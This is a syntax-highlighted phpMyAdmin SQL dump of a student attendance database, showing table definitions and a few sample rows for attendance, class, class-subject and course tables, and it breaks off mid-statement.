<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span> phpMyAdmin <span class="token constant">SQL</span> Dump</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">--</span> version <span class="token number">5.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">www.phpmyadmin.net</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">--</span> Host<span class="token operator">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">--</span> Generation Time<span class="token operator">:</span> Oct <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">2020</span> at <span class="token number">04</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">PM</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">--</span> Server version<span class="token operator">:</span> <span class="token number">10.4</span><span class="token number">.11</span><span class="token operator">-</span>MariaDB</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">--</span> <span class="token constant">PHP</span> <span class="token literal-property property">Version</span><span class="token operator">:</span> <span class="token number">7.2</span><span class="token number">.28</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token constant">SET</span> <span class="token constant">SQL_MODE</span> <span class="token operator">=</span> <span class="token string">"NO_AUTO_VALUE_ON_ZERO"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token constant">SET</span> <span class="token constant">AUTOCOMMIT</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token constant">START</span> <span class="token constant">TRANSACTION</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token constant">SET</span> time_zone <span class="token operator">=</span> <span class="token string">"+00:00"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token comment">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token comment">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token comment">/*!40101 SET NAMES utf8mb4 */</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">--</span> Database<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_attendance_db</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="29"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="30"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">doc</span><span class="token template-punctuation string">`</span></span> date <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="32"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">doc</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 20:06:37'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="49"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="50"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="51"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="52"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">COMMENT</span> <span class="token string">'0=absent,1=present,2=late'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="53"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 20:06:37'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 20:06:37'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="67"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="69"></td><td><pre></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="71"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="72"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="73"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">level</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="74"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">section</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="75"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">status</span><span class="token template-punctuation string">`</span></span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token number">1</span> <span class="token constant">COMMENT</span> <span class="token string">'1=Active, 0=Inactive'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="76"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre></pre></td></tr><tr><td data-num="79"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="80"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">level</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">section</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">status</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="84"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:48:45'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="85"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:52:58'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="86"></td><td><pre></pre></td></tr><tr><td data-num="87"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="88"></td><td><pre></pre></td></tr><tr><td data-num="89"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="90"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="91"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="92"></td><td><pre></pre></td></tr><tr><td data-num="93"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="94"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="95"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="96"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="97"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="98"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_ids</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="99"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="100"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="101"></td><td><pre></pre></td></tr><tr><td data-num="102"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="103"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="104"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">student_ids</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="107"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'0000-00-00 00:00:00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="108"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'0000-00-00 00:00:00'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="109"></td><td><pre></pre></td></tr><tr><td data-num="110"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="111"></td><td><pre></pre></td></tr><tr><td data-num="112"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="113"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="114"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="115"></td><td><pre></pre></td></tr><tr><td data-num="116"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="117"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="118"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">course</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="119"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="120"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="122"></td><td><pre></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token 